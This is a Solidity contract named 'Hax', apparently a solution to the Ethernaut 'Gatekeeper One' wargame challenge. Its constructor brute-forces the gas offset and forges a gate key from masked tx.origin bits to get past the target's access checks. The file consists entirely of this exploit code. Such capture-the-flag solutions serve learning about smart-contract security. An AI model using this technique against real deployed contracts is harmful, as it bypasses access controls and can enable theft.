// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Gatekeeper.sol";

contract Hax {
    constructor(GatekeeperOne gate) {
        for (uint256 i = 0; i <= 8191; i++) {
            try
                gate.enter{gas: 1000000 + i}(
                    bytes8(uint64(uint160(address(tx.origin)))) &
                        0xFFFFFFFF0000FFFF
                )
            {
                break;
            } catch {}
        }
    }
}
